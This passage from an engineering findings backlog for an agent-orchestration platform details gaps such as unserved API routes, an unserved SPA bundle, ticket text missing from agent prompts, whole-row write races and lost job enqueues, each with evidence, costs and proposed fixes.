  `ROLE=all|worker` — which is honest, and is why **WP-22 must not gate `depends_on` on `/readyz`**
  (recorded in TD-023).
- **No webhook ingress** — now **WP-15c**. `apps/server/src/routes/` has none, so nothing in production
  emits `ticket.matched` even once an audit log exists. Carved off WP-15a's number rather than WP-08's or
  WP-09's because it spans both providers *and* the unwritten `inbox`, and because the inbound redaction
  step `docs/TODO.md` has open belongs to the same door.
- **A re-dispatch/backfill tool**, owed by **WP-19** with an acceptance criterion already on its plan row
  (*"a run that finished before the ledger's handler was registered appears in the rollups after a
  backfill"*), because `run.finished`/`run.failed` are swept today (the cost ledger is unbuilt). The loss
  is recoverable: `runFinishedEvent` carries `usage`, `model_usage`, `cost`, `num_turns`, `wall_ms`, and
  `events` is append-only. Checked rather than rewritten: the row says it.

Also open, smaller: the consumption table is **derived from the implementation** rather than a declaration
the implementation must meet — a row that stays `unconsumed` after its WP lands re-opens the hole silently,
and guarding that direction needs a second list of landed WPs (stated, not built). It is the *safe*
direction that is guarded today and the *unsafe* one that is not, which is standing rule 7's shape again.
What done looks like is small and worth naming so it is not re-derived: the WP that flips a row to
`handled` — **WP-19** is the first — also asserts that no row it owns is still `unconsumed`, so the
declaration is held by the work package rather than by a global list nobody maintains.

### 29. **The SPA calls twenty `/api/*` paths and the server registers four — the read surface of technical/08 was never anybody's work package** (**cause RESOLVED** at `19da103`, WP-15h part 1; **every read the SPA calls is served** after WP-19, WP-18b and WP-15h part 2 — what remains in the census's admitted gaps is the **command** surface, twelve writes, unowned; serving the SPA itself is backlog **33**)

> **Session 5.** The recurrence is closed by `apps/server/src/routes/client-census.test.ts`, which fails on a
> path the client names and the server does not serve, over tracked **and** untracked client files, in both
> directions. The run endpoints, `GET /api/tasks/:id` and the `run:<id>` publisher landed; `/api/org/agents`,
> `/api/org/inbox`, `/api/integrations` and its setup guide, `/api/projects` and its `readiness`, `budgets`,
> `tasks`, `kb/tree`, `kb/doc`, `kb/proposals` children remain, each named in the test with the row that owns
> it, so the census is the honest list rather than this entry. Part 2 is WP-15h's second commit.

**What is wrong.** WP-20 shipped every screen and WP-15g now writes real `run_messages` rows, and **nothing
joins them**: the server has no route that returns a run, a task, a transcript, an inbox, an agent, a budget
or a KB document, and nothing publishes to the `run:<id>` SSE topic the hub already carries. WP-15g's
discovered-work list names one half of this ("the SSE half of the transcript is not composed"); the cause is
larger than that item, and stating it as the transcript's problem would schedule one endpoint out of sixteen.

**Evidence** (refiner, session 4 — grep and `gh`, no test run, rule 66).
- **The client's list**: `apps/web/src/api/endpoints.ts` calls **20** distinct `/api/*` paths, including
  `/api/runs/${runId}/messages` (`:238`), `/api/runs/${runId}` (`:236`), `/api/runs/${runId}/prompt`
  (`:243`), `/api/runs/${runId}/context-pack`, `/api/tasks/${taskId}` (`:235`), `/api/org/agents` (`:212`),
  `/api/org/inbox` (`:213`), `/api/integrations` (`:214`), `/api/projects` (`:220`),
  `/api/projects/${id}/tasks` (`:230`), `/api/projects/${id}/readiness` (`:226`),
  `/api/projects/${id}/budgets` (`:228`), and three `kb/*` paths.
- **The server's list**: **four** — `/api/version` (`apps/server/src/routes/ops.ts:137`), `/api/org/users`
  (`org.ts:62`), `/api/org/audit` (`org.ts:75`), `/api/projects/:project_id/config` (`projects.ts:40`).
  Seven `typed.get` registrations exist in `apps/server/src/routes/` in total, three of which are
  `/healthz`, `/readyz` and `/metrics`; `/api/auth/*` is Better Auth's. `apps/server/src/queries/` holds
  exactly one file, `identity-queries.ts`.
- **The transcript half, specifically**: `RunTranscriptSink`'s docblock says an entry goes to *"`run_messages`
  plus the `run:<id>` SSE topic (TD-007, technical/08)"*
  (`packages/application/src/ports/runner.ts:256`), and `apps/server/src/sse/hub.ts:4-5` already lists
  `run:<id>` among the topics a connection may watch — **nothing publishes one**. It cannot be a `NOTIFY`
  payload (broadcasts are capped at 7 000 bytes and carry hints — WP-15g), so it is a read-back from the rows
  WP-15g finally writes, which is why it needs the same read API.
- **Why no tier caught it**: WP-20's acceptance criterion is *"Playwright e2e with fake SSE"*
  (`13-implementation-plan.md`:48) and `pnpm test:web-e2e` runs "against the built bundle and a fake API/SSE
  backend" (CLAUDE.md). The one tier that exercises the client's endpoint list answers it with a fake, and
  **no check compares the two lists** — so sixteen missing routes are green in every target.

**What it costs to leave.** The platform can now run an agent and store its transcript, and a user can see
none of it: every screen except sign-in, version, the audit list and one config read answers 404 against a
real server. It also hides a *live* property — WP-15g's transcript redaction is real and unreadable, so
nothing but a test can show that a run's secret did not reach a screen.

**What "done" looks like.** The plan row below. The part that prevents the recurrence rather than the
instance: **a census that reads both lists off disk** — the client's paths from
`apps/web/src/api/endpoints.ts`, the server's from its registered routes — and fails on a path the client
names and the server does not serve, the shape `apps/launcher/src/docker-access.test.ts` and
`packages/integrations/src/providers/delivery-key-redaction.test.ts` already use. `openapi.json` is generated
from the routes (`apps/server/src/app.ts:241`), so it can be the server's half but never the client's.

**Depends on / owner.** **None today**, and that is the finding: WP-06 built the server skeleton, WP-20 built
the screens, and no row owned the surface between them. Now **WP-15h**, which depends on WP-06, WP-15g and
WP-20 (all landed) and is blocked by neither Q52 nor WP-22 — it is Node and Postgres work, no daemon.

### 33. **Nothing serves the SPA, and since WP-22 the bundle is in the image** (TODO — **no work package owned serving it**; the same shape as entry 29, one layer out)
**What is wrong.** technical/09 and `apps/web/vite.config.ts` both say the app process serves the built
bundle; no route does. So a `docker compose up` instance ships the SPA and answers 404 for it.

**Evidence** (WP-22 implementer, session 5, discovered work). technical/09:6 reads *"Served as a static
bundle by the app process with SPA fallback; same origin as the API and SSE"*, and `apps/web/vite.config.ts`
says in production `apps/server` serves `dist/`. There is **no `@fastify/static`, no `sendFile`, and the only
`setNotFoundHandler` answers JSON**. `docker/app.Dockerfile` builds `apps/web` and copies it to
`/app/apps/web/dist`, so the **packaging half is done** and the serving half is a route plus a fallback rule.
No `APP_WEB_ROOT` was added: a variable nothing reads is rule 31's shape.

**What it costs to leave.** WP-22's own criterion is *"a working instance"*, and the product's entire user
surface is unreachable on one. It also makes WP-23's dogfood criterion — a stranger installing in under an
hour — unmeetable, because the stranger has nothing to look at. Same-origin is not a nicety: the SSE client
and the API client both assume it, so any stop-gap that serves the bundle from a second origin re-opens auth
and CORS questions the design closed.

**What done looks like.** One static route plus a fallback, and the fallback is **allow-list shaped, not
deny-list shaped** (rule 55): it must decide which paths are the client's without enumerating API prefixes to
exclude, because a future `/api/*` or `/webhooks/*` route added by someone who never reads the fallback must
not silently start returning `index.html`. Asserted by an unknown client path answering the shell, an unknown
`/api/*` path still answering JSON 404, and `/events` unaffected.

**Depends on / owner.** **None today** — that is the finding again, and it is entry 29's shape one layer out:
WP-20 built the bundle, WP-22 packaged it, and no row owned the process that hands it to a browser. WP-23 is
documentation and cannot own a route. **Recommendation: it belongs to WP-15h part 2**, which is open, already
owns `apps/server/src/routes/` and already carries the client-route census — a sentence has been added to
that row. The fallback rule is an engineering decision, not a product one; it needs no open question.

### 37. **The KB health report is written nightly, ~~read by nobody~~ (read by `GET /api/projects/:id/kb/health` since WP-15h part 2 — an endpoint no screen calls yet), and cannot contain two of the findings its own documents promise** (the reader half **RESOLVED** at WP-15h part 2; the invalid-documents half TODO — **no work package owns it**; found by WP-18b and WP-18a, session 5)
**What is wrong.** Two halves, both about the same report, and they have **different causes** — which is why
they are one entry with the causes named rather than two:
- **No reader.** `kb_health_reports` (migration **0018**) gains a row per project per night from the hygiene
  pass, and nothing reads it: `GET /api/projects/:id/kb/health` is published by
  `docs/technical/08-api-and-realtime.md:21` and is not served, no screen asks for it, and the report is
  visible only in a log line and in the table.
- **Two findings cannot be computed at all.** The pass reports `expired`, `dangling`, `duplicate` and
  `oversized`. *Deprecate candidates* needs `run_context_pack` rows, which nothing writes (entry **31**) —
  already stated, at `docs/technical/07-knowledge-and-search.md:185-190`. And **a document the parser
  refused is in no report**, although `docs/technical/07-knowledge-and-search.md:8` says
  *“Validation on index: frontmatter schema, dangling wikilinks, expired items, duplicated ids; results
  feed the KB health report.”* That is a **defect against the document**, not a documentation error: the
  pass reads the *index*, and an invalid document was deliberately never indexed, so it is in no table at
  all — `IndexReport.invalid` lives for the length of one job
  (`packages/application/src/knowledge/indexer.ts:34-39,76,220-234`). Joining them means storing the
  refusals or running the pass inside the index run; neither was WP-18b's to decide.

**Evidence that the recurrence guard does not cover this** (refiner, session 5 — file reads, no test run,
rule 66), and it is the part worth carrying: `apps/server/src/routes/client-census.test.ts` closed entry
**29**'s *cause* by comparing the **client's** paths against the router in both directions. Its scope is
therefore what a client calls — and `apps/web/src/api/endpoints.ts` names three KB paths (`kb/tree` at
`:248`, `kb/doc` at `:250`, `kb/proposals` at `:255,304`) and **not** `kb/health`. So an endpoint that
technical/08 publishes, that has a producer writing rows, and that no screen has been built for is in
neither list and fails nothing. The census is a client-driven census; the gap between *the API technical/08
publishes* and *the API the server serves* is still uncensused.

**What it costs to leave.** product/05's health report is the only thing that tells a maintainer their vault
is rotting, and today the platform computes it every night and shows it to nobody — the rows accumulate as
evidence that would have been worth something. The second half costs more than it looks: a document whose
frontmatter the parser refuses is **silently absent from every pack**, so a project can add a page, see it
in git, and never learn that no agent will ever be shown it.

**What “done” looks like.** (a) One route plus one panel, gated like the other KB reads, serving the newest
report per project and distinguishing *no report yet* from *a report with no findings* (rule 18). (b) A
decision for the refusals: either the index run stores them (a table or a column the pass can read) or the
pass runs inside the index run — and whichever is chosen, `docs/technical/07-knowledge-and-search.md:8` is
amended in the same change if the answer narrows it. (c) The census grows a second direction — the paths
technical/08 publishes against the routes registered — or this entry's shape recurs for
`PUT …/kb/doc`, `GET …/kb/search` and `POST …/kb/bootstrap`, which are in exactly the same position and are
listed honestly at `docs/technical/08-api-and-realtime.md:27-35`.

**Depends on / owner.** **None today.** Recommended: the **reader** half belongs to **WP-15h part 2**, which
owns `apps/server/src/routes/`, already carries the census and already has the other seven read paths — a
sentence naming `kb/health` has to be added to that row explicitly, because the census will *not* produce it
on its own. The **refusals** half is the indexer's and belongs to whoever next touches
`packages/application/src/knowledge/indexer.ts`; it is not WP-15h's, and pretending otherwise is how a
finding ends up owned by a row that cannot do it. Related: entry **31** (the third finding kind), entry
**29** and entry **33** (the same shape, one and two layers out). The sibling gap from the same work
package — a knowledge merge request nobody merges is invisible — is **not** filed here: it is a product
decision first and is recorded on **Q66**, whose last paragraph asks whether an un-merged knowledge MR
should expire.

### 23. **The platform never reads the ticket's text, so the first agent stage is given a key and a URL** (TODO — **no work package owned it**; now **WP-15f**, and its product half is **Q61**)
Placed here, above the concurrency findings and above the retrieval family it heads, because it is
entry 1's sentence one layer further in: *the loop starts now, and what it starts on is a ticket
identifier.* One cause; three symptoms; the two that are inside this repository's control are below.

**What is wrong.** `tasks` stores `ticket_provider` / `ticket_key` / `ticket_url` and nothing else
about the ticket, `ticketRefSchema` is `{provider, key, url}`, and `ticket.matched` carries no title.
The port that *can* read a ticket already exists and returns everything that is missing —
`TaskManagementPort.readTicket` (`packages/application/src/ports/integrations/task-management.ts:179`)
yields a `Ticket` with `title`, `description`, `comments[]`, `links`, `epic`, `siblings` and
`attachments_text` (`:76-95`) — and **nothing in the pipeline calls it**. So the two places built to
consume the ticket's content are handed its identity instead: the retrieval query, and the prompt's
own task block.

**Evidence.** Quoted from the WP-17 review, which confirmed it end to end independently of the
implementer that first reported it:

> `tasks` has `ticket_provider/key/url` and nothing else (migration 0004 lines 6–8); `ticketRefSchema`
> is `{provider, key, url}`; `ticket.matched` carries `rule/priority/issue_type/epic/links` and no
> title. At the first agent stage `taskTextOf` is the ticket key alone, and:
>
> ```
> extractQueryTerms('ACME-1')    -> ["acme"]
> extractQueryTerms('PROJ-1234') -> ["proj","1234"]
> ```
>
> WP-17 built a correct delimiter and a correct wire; what flows through it at `refinement` is **one
> term**. That is a platform gap, not a WP-17 defect.

and from the implementer, which met it first and named the remedy's shape:

> technical/07 step 2 builds the query from "task text (ticket + spec)". At the **first** agent stage
> there is no spec, so `taskTextOf` yields the ticket key alone. Every later stage gets the prior
> artifacts' JSON. So the pack at `refinement` is tier-0 plus whatever one keyword finds, and **no
> amount of ranking work changes that**. Needs a product decision about where ticket text is stored:
> inbox payload? a provider fetch from the outbound job? a `tasks.ticket_title/body` column fed by
> intake?

**Four things read off disk while filing this** (grep and reading, no test run — rule 66), because
they decide how big the finding is:

- **The prompt's task block is three lines.** `ticketBlock` (`packages/domain/src/prompt/assembly.ts:342-351`)
  builds the `kind="ticket"` data block's body as exactly `provider:`, `key:`, `url:`. So the second
  symptom is larger than the first: **the agent is not shown the ticket either**, not merely the
  retrieval that would find documents about it.
- **Nothing can fetch it at run time either.** `get_task_context` — the platform tool whose whole job
  this is — refuses by name in the production tool surface
  (`apps/server/src/platform-tools.ts:111`), and technical/05 §2/§3 give the workspace no network
  path to the platform and an allow-listed egress sidecar, so an agent cannot open the ticket URL
  it is given.
- **`readTicket` has no production caller.** 40 references in the tree; **0** under
  `packages/application/src/pipeline/`, `apps/server/src/` or `packages/domain/src/` — the rest are
  the port, the fake, and the contract suites.
- **No test can fail because of any of this.** `FakeClaudeRunner` selects its scenario from
  `spec.stage` (`packages/infrastructure/src/runner/fake-claude-runner.ts:96`) and never reads the
  prompt, so the fake-Claude e2e is green on a prompt with no ticket in it. That is the fake behaving
  correctly, and it is why this survived to WP-17.

**Is it a defect, or is a document wrong?** The documents are right and the code is behind them, so
**no decision record is amended**: technical/04 § "Prompt assembly" step 5 specifies *"Task block:
**the ticket**, artifacts, return feedback, human comments…"*, technical/07:11 specifies the query
input as *"task text (ticket + spec)"*, and product/13 § "Prompt architecture" layer 4 specifies
*"ticket (delimited as data)"*. All three name content the platform does not hold. Note also that
`extractQueryTerms`' own docblock (`packages/domain/src/knowledge/query.ts:59-62`) explains its
first-seen ordering as *"the terms kept are the ones nearest the start of the ticket, **which is where
a title sits**"* — the module was written against the input the doc describes and receives a key.

**What it costs to leave.** The product's headline claim is that a ticket reaches a merge request
without a human watching, and the first agent in that chain is asked to write a spec for a ticket it
has never read. Every downstream artifact is derived from that spec, so the error is not bounded to
one stage: it is the input of the whole pipeline. It also fails **silently and expensively** — the
pack is well-formed, `run_context_pack` faithfully records the tokens spent on a pack assembled for a
one-term query, and the audit is therefore an accurate record of the agent having been shown nothing.

**What would make it urgent.** It is already live rather than latent — WP-17 shipped the wire and
WP-15c made production start tickets — and the only reason nobody has *seen* it is that no production
run reaches a real model (`unavailableClaudeRunner`, Q52). So the trigger is the first real-model run:
the day a launcher transport exists, this is the first thing a human notices about the output, and it
will be mistaken for a prompt-quality problem. Fix it **before** the first real-model run, not after.

**What done looks like.** The first agent stage is given the ticket's own words:
- the platform reads the ticket once per task through `readTicket`, via a **fourth
  `pipeline.outbound` duty** beside `intake_check`/`workpad`/`status`
  (`packages/application/src/pipeline/jobs.ts:69`) — WP-15d's shape, so the call is made outside every
  transaction and goes through `IntegrationActionExecutor` like every other outbound call;
- the text is stored **bounded and redacted**, written by a **narrow** repository method and never a
  whole-row `tasks.save` — the snapshot writer is a job running beside the stage executor, which is
  exactly entry **18**'s interleaving, and this work package must not create the twenty-first instance
  of it;
- `taskTextOf` (`packages/application/src/pipeline/planner.ts:190`) builds the query from title +
  description (+ the artifacts it already adds), and `ticketBlock` renders title, description and
  comments inside the existing data block — nothing about the delimiter contract changes, which is
  the half WP-17 already got right;
- asserted by a test that a `refinement` prompt for a ticket titled *"rollback sessions after a failed
  migration"* contains those words inside a `kind="ticket"` block and that `extractQueryTerms` over the
  same task yields more than one term. Neither assertion needs a model or a container.

**The product half is real, and it is Q61** (filed with a recommendation strong enough to build from).
Storing ticket text is not free and is not obviously the platform's to store: it is untrusted external
text (BD-022), it goes stale the moment a human edits the ticket, `readTicket` is measured
**unbounded** (Q54: one `readTicket` at **53,284,565 bytes** across 8 unbounded paths), and a stored
copy is personal data in a place the retention rules have not considered. What is *not* a real
objection, and is worth recording so it is not re-raised: the platform already stores untrusted
external text in two places under a stated rule — `inbox.headers`/`payload` (redacted, migration 0014)
and `kb_chunks` — so this is a new *instance*, not a new *kind*, of a thing already decided.

**Where this sits against entries 15 and 16, stated rather than left to be noticed.** The three are
one subject: **entry 15 is a query that is too broad** (thirteen function words fill 87 % of the
budget), **this is a query that is too narrow** (one term), and **entry 16 says the instrument can
measure neither**. The ordering consequence is the part that changes what someone should work on:
**tuning relevance is premature until this lands.** A precision floor applied to `["acme"]` makes the
pack emptier, not better; Q58 asks which ranking signal to add, and calibrating one needs the query
distribution the platform will actually send, which today does not exist. Entry 15 currently reads as
actionable and is not — a line has been added to it pointing here. Entry 15's own text also carries the
assumption this measurement falsifies: *"the queries that reach it are `kb_search` calls written by a
model and ticket text written by whoever files tickets"* — the second half is not true and cannot be
until this entry closes.

**Needs measurement** (rule 66, none run here): whether a title-plus-description query changes what the
retrieval layer returns on anything but the fixture vault is **unknown and unmeasurable today** —
entry 16 is the reason. This entry's own acceptance does not depend on it: "the ticket's words are in
the prompt and in the query" is assertable without a corpus, and "the pack is better" is not.

**Depends on.** WP-15c (landed, the intake path), WP-15d (landed, the outbound-job shape), WP-17
(landed, the delimiter and the real pack), and **Q61** for the storage decision — which the
recommendation answers, so the row is buildable without waiting. Owner: **WP-15f** in
`13-implementation-plan.md`; **no row owned it before tonight**, and the three symptoms were spread
across WP-16 (the query), WP-17 (the prompt) and WP-20 (the board card, Q48) with no row holding the
cause. Related: entry **11** (the wire that now exists), entry **12** (its zero-width half becomes
live the day ticket text reaches a query), entries **15**/**16** below, **Q48** (the same missing
`title`, seen from the board), **Q54** (the byte bound this work package has to pick).

### 18. **Every other `tasks.save` is a whole-row write, and a concurrent writer silently puts stale state back** (TODO — now **WP-15e**)

> **RESOLVED at WP-15e pending merge — see the row** (the milestone table's **WP-15e** row and *"WP-15e — the whole-row save class, and the shape the measurement chose"* under `## WP notes — session 5`; the change is uncommitted at the time of writing, and this heading, standing rule **79** and the WP-15e plan row are orchestrator-owned and left as they are).

**What is wrong.** `TaskRepository.save` (`packages/application/src/pipeline/store.ts:80`) writes the
**whole** row. That is correct for a saga step — the aggregate it writes is the one it read in the same
transaction, and the pipeline orders those — and it stopped being correct the moment a writer appeared
*outside* that ordering. WP-15d created the first one in the ordinary course of moving a provider call out
of a transaction: the workpad's "remember where the comment lives" write now happens in a `pipeline.outbound`
job that runs **beside** the stage executor's transactions, which makes it a read-modify-write across a
concurrency boundary that did not exist before. **One writer is fixed; the class is not.**

**Evidence**, quoted from the WP-15d review rather than paraphrased:

> "a bug ticket walked all seven agent stages and finished with `cost_actual` 2.40 instead of 2.80,
> because the workpad's whole-row write landed between the executor's read and its write and put a
> stale cost back."

The implementer met it first and its account adds the second half: the **first `verify:e2e` after the move
failed twice** — the bug ticket above, and a feature ticket that **"sat at `ci_gate` until the 90 s settle
gave up"**. *One cause.* The stale snapshot put back the cost, the state **and** the stage, which is the
part that matters beyond this instance: the loss is **not confined to the column the racing writer meant to
touch**. The fix shipped for exactly one writer — a narrow port method `tasks.saveWorkpad(tx, taskId, ref)`
(`store.ts:97`), one column, pinned by the contract-suite case *"writes the workpad without writing anything
else, so a concurrent cost survives"*; the reviewer confirmed the method really writes one column and that
its two contract cases run by name. The measurement is preserved in the method's docblock (`store.ts:82-95`).

**The scope of what is left, read off disk while filing this and not measured** (`grep` over the tree,
2026-09-11): **twenty** production `tasks.save` call sites — `stage-executor.ts` 4 (`:199`, `:453`, `:518`,
`:548`), `transitions.ts` 5 (`:127`, `:163`, `:190`, `:219`, `:265`), `saga.ts` 11. *Which* of them can run
concurrently with another writer is exactly the part nobody has established; the count is the cheap half.

**What it costs to leave.** A **silent data-corruption class**, and both properties that make it worse than
an ordinary race are demonstrated rather than argued: it is silent — nothing throws, nothing logs, a number
is simply wrong afterwards — and it reaches columns the racing writer never meant to write, so its second
observed symptom was a task that **stopped moving** with no error anywhere. The first instance was found only
because a cost happened to be summed by an assertion, and what it corrupted is the platform's own record of
spend, which BD-003's audit claim and WP-19's ledger both rest on.

**What would make it urgent.** The *instance* is gone and the *class* is one code change away: WP-15d
created a concurrent writer while doing something routine, and the next work package that moves a write into
a job does it again with nothing to stop it. `APP_DISPATCH_MAX_CONCURRENCY` above its shipped 1, and
WP-15c's ingress delivering a burst, widen every window that already exists.

**What done looks like.** Two shapes were named at WP-15d and the choice is **deliberately open** — WP-15d
took the first for one writer without claiming it as the answer for the class:
- **a narrow write per writer**, one column per update, like `saveWorkpad`. Cheapest, no migration — and it
  **does not compose**: every new writer needs a new method and a reviewer who notices that it needs one.
- **optimistic concurrency on the row** — a version column, a `save` that refuses a write over a row that
  moved, a caller that retries. It catches the writer nobody anticipated, which is the property the narrow
  method lacks, at the cost of a migration, a retry policy and an error path per call site.

Whichever ships, the criterion is the same: `save` must be **incapable** of silently overwriting a
concurrent change, asserted by a test that reproduces the interleaving **deliberately rather than under
load** — and **the reproduction already exists** (WP-15d's shape: a job writing a task row beside a
stage-executor transaction), which is worth more than the argument. Both columns are worth asserting
separately, because the two observed symptoms were different columns.

**Not an open question.** It is an engineering choice between two known shapes with a reproduction to
measure them against, not a product decision; filing it in `OPEN-QUESTIONS.md` would ask the founder to pick
a concurrency-control strategy, which is the same mistake entry 17 refused for TD-004/TD-005.

**Needs measurement** (not run here, rule 66): which of the twenty call sites can actually interleave —
the per-site answer is what decides between the two shapes, and a narrow write per writer is only cheaper
than a version column while the list is short.

**Depends on.** WP-15d (landed; it created both the first concurrent writer and the reproduction). Owner:
**WP-15e** in `13-implementation-plan.md`. Related: entry 17 (the move that exposed it), entry 1 (nothing
produces production load yet, which is the only reason this is scheduled rather than urgent).

### 20. **A matched ticket whose intake enqueue is lost is never started again, and nothing says so** (TODO — **WP-15c**, criterion now on its plan row)
**What is wrong.** The other half of entry 1's sentence, one layer in. Since WP-15d the intake handler
**writes nothing**: `pipeline.intake` (`packages/application/src/pipeline/saga.ts:194`, priority 10) checks
the 1:1 dedup and enqueues a `pipeline.outbound` job with `duty: 'intake_check'` through
`context.afterCommit` (`saga.ts:224`), and the task row is created by the job. `afterCommit` is at-most-once
(TD-004, and its own docblock), so a crash between the handler's commit and the enqueue leaves a **matched
ticket with no task row** — which nothing re-emits, nothing retries and nothing logs.

**Evidence** (WP-15d review round 1). The implementer's first version of this sentence claimed a mitigation
— *"the same outcome as a `ticket.matched` that was never delivered, and the poller that produced it is
what tries again"* — and it was **false in both halves** and corrected in the tree (rule 44). What replaced
it is established rather than assumed:
- **There is no poller.** A grep over `packages/application/src` and `packages/integrations/src` finds only
  `packages/application/src/ports/integrations/task-management.ts:157`'s comment — *"the polling fallback
  only"*.
- **A webhook re-delivery will not re-emit it either**: WP-15c's own plan row
  (`docs/technical/13-implementation-plan.md:38`) accepts *"a replayed delivery is deduplicated by
  `inbox(provider, delivery_id)` and performs nothing twice"*.
- **And the loss is silent**: `packages/application/src/events/event-bus.ts:377-392` logs only the case
  where the callback *threw*.
- **Re-dispatching the same event does not help, and that is by design** (resolved against the tree here so
  nobody proposes it as the fix): `handlerExecutions.claim` (`event-bus.ts:351`) and `complete` (`:370`) run
  **in the handler's own transaction**, so the record that `pipeline.intake` ran commits together with the
  effect and a second dispatch of that event position returns `skipped`. A **new** `ticket.matched` event is
  different: `findByTicket` (`saga.ts:204`) returns null while there is no task, so intake enqueues again.

**The implementer declined to add a log line, and the reason is worth carrying rather than re-deriving**:
the loss is a process death between two statements, so the process that would write the log is the one that
died. It named the detectable form instead — **a query: a matched ticket with no task row** — and left the
criterion to the ingress.

**What it costs to leave.** One ticket, matched, silently never started, with no signal anywhere; a human
re-matches it by hand, and nothing tells a human to. For a platform whose headline claim is that a ticket
reaches an MR without anyone watching, "sometimes a ticket is dropped and nobody finds out" is the failure
that costs trust rather than time.

**What would make it urgent.** Nothing emits `ticket.matched` in production today (entry 1), so the window
does not exist yet. It opens the day **WP-15c**'s ingress lands — and the same day widens it, because the
first thing an ingress delivers is a burst and a process that dies mid-burst loses every enqueue it had not
yet made.

**What done looks like, and the tension it has to resolve rather than ignore.** The recovery must not
contradict WP-15c's dedup criterion, and it does not, because **the two name different units: dedup is a
statement about a delivery, recovery is a statement about a task.** Recommended shape, stated strongly
enough to be implemented without re-deciding it: a reconciliation finds matched tickets with no task row and
**re-emits `ticket.matched` as a new event** — not a re-dispatch of the old one, which is skipped by the
claim record above — leaving `inbox(provider, delivery_id)` untouched, so the delivery is still performed
exactly once while the *task* the platform owes for it is created. It is safe to run blind because intake is
idempotent on `tasks_project_id_ticket_key_mode` (`saga.ts:204`). **Detection alone is the weaker half and
should not be the whole answer**: a metric tells a human to do what the platform exists to do. Surface it
too, by all means — the query is the mechanism either way.

**Needs measurement**: none to start. The reproduction is deterministic and cheap — drop the `afterCommit`
callback (or kill the process between the commit and the enqueue) and assert the ticket still reaches
`task.completed`.

**Depends on.** **WP-15c** (owner; the criterion is on its row). Related: entry 1 (the ingress that does not
exist), entry 17 / WP-15d (the move that opened the window), and WP-19's re-dispatch/backfill tool, which is
a **different** mechanism and does **not** cover this — replaying the same event position is skipped by the
handler-execution record, which is the whole reason the recovery is task-shaped.

### 36. **A lost curation wake-up loses one task's proposals, and nothing recovers it** (TODO, small — entry **20**'s cause at a second site, stated as a residual by WP-18b; **no work package owns the recovery**)
**What is wrong.** The same mechanism as entry 20, one stage later: the `artifact.created` handler decides
and enqueues the `knowledge.proposals` job through `context.afterCommit`
(`packages/application/src/knowledge/librarian.ts:344`), and `afterCommit` is **at-most-once** (TD-004). A
process that dies between the handler's commit and the callback leaves a `LibrarianProposals` artifact on a
merged task with **no `kb_proposals` rows** — nothing re-emits, nothing retries, nothing logs.

**Evidence** (WP-18b implementer, session 5; stated at the line rather than discovered later). The module's
own docblock is the source: *“a process that dies between the handler's commit and its enqueue loses the
wake-up, and this project's proposals are never recorded… the nightly pass recovers an **approved** proposal
that was never applied, which is the loss that costs a human's decision, and deliberately not this one”*
(`packages/application/src/knowledge/librarian.ts:17-23`).

**What it costs to leave.** One task's learning, silently. It is **notification-shaped** — nothing is
corrupted, the artifact is still on the task, and the next retrospective on that project proposes again —
which is the direction rule 20 says to fail in, so this is a small entry and not a large one. What it does
cost is the product's own claim: the knowledge base is what makes the second task cheaper than the first,
and a batch dropped by a restart is not visible to anyone.

**What “done” looks like, and the part that is *not* obvious.** A sweep for `LibrarianProposals` artifacts
whose `task_id` has no `kb_proposals` row, re-enqueuing the curation — `kb_proposals` carries `task_id` and
`run_id`, so the query is expressible today
(`packages/infrastructure/src/db/migrations/0008_knowledge.sql:58-76`). Two things it has to answer, both
read off the tree here:
- **A curation that ran and proposed nothing is spelled identically to a curation that never ran** (rule
  18). So the sweep needs a mark that the curation *happened* — a row, a status on the artifact, or a
  `handler_executions`-style record keyed on `artifact_id` — or it will re-run the curation of every task
  whose model had nothing to say, for ever.
- **The curation job is not idempotent on the artifact.** Its queue is declared `standard` with no
  `singletonKey` (`packages/application/src/knowledge/runtime.ts:10-13`, and the enqueue at
  `packages/application/src/knowledge/librarian.ts:344-348` passes none), unlike the apply job, which is
  `stately` with `singletonKey: project:<id>` (`packages/application/src/knowledge/apply.ts:352`). So a
  blind re-enqueue writes a **second** set of proposal rows for the same artifact rather than replacing the
  first.
Cheapest shape, stated strongly enough to build from: put it in the **nightly hygiene pass**, which already
runs once per project per night, already exists to recover the costlier loss, makes no git call and deletes
nothing (`packages/application/src/knowledge/hygiene.ts`) — and give the curation an idempotency key on
`artifact_id` in the same change, because the recovery is worthless without it.

**What would make it urgent.** Nothing today, and the trigger is worth stating: the window only exists on a
deployment where a real run produces a `LibrarianProposals` artifact, which needs the runner composed
(WP-15g's provisioner). It widens with restarts — a rolling deploy at the end of a busy day is the shape
that loses several at once.

**Needs measurement: none.** The reproduction is entry 20's, one event later: drop the `afterCommit`
callback and assert the proposals still arrive.

**Depends on / owner.** **None today.** Entry **20** is the precedent and WP-15c's
`pipeline.intake.reconcile` is the worked example of the recovery shape (a *new* event, not a re-dispatch,
because `handler_executions` skips the old position). Cheapest home: whoever next touches
`packages/application/src/knowledge/hygiene.ts`.

### 17. **The pipeline calls providers from inside an open database transaction** (**RESOLVED** at `8ae121c`, WP-15d — kept for its evidence; the residue is entry **19**, the class it exposed is entry **18**)
**What is wrong.** Three event handlers call an integration provider while the handler's transaction
is still open, so a pooled connection is held across provider network latency and the audit write
nests inside the caller's transaction instead of following it. It is the **cause** of two things that
were found first and fixed separately: WP-15b's dropped foreign key, and the pool arithmetic WP-15b
is correcting. The cause itself is unfixed and unowned.

**Evidence**, quoted from the WP-15b review rather than paraphrased:

> `packages/application/src/pipeline/saga.ts:215` calls a provider **after** `store.tasks.insert`,
> **on the same open scope**. `postgres-unit-of-work.ts:55` takes a second `pool.connect()`, which
> is how the audit write — committing in its own transaction — was able to run while the saga's was
> still open.

Resolved against the tree, so nobody re-derives it: the call at `saga.ts:215` is
`unprotectedDefaultBranch` (`saga.ts:251`), which makes **two** provider reads —
`defaultBranch` (`saga.ts:261`) and `branchProtected` (`saga.ts:265`) — inside `pipeline.intake`,
a handler at **priority 10**, the core band. The unit of work is
`packages/infrastructure/src/events/postgres-unit-of-work.ts:55` — the report cited `db/`, which is
the wrong directory and the right line. **Three sites, one cause**, and the count is not this entry's
guess — `packages/application/src/pipeline/runtime.ts`'s own docblock already names them: *"Three
handlers do it today — the intake default-branch read, the workpad and the status mapping"*. The
other two are `workpad.ts:168` (`upsertWorkpad`, priority 120, which then writes `tasks` on the same
scope at `:183`, so the transaction is held across the call **and** continues after it) and
`workpad.ts:218` (`transition`, priority 110). Read from code and **not** measured: each
`forProject` also re-reads the project's bindings through a repository built from the pool
(`apps/server/src/pipeline.ts:265`) and the loader has no cache (see "Discovered work", WP-15a), so
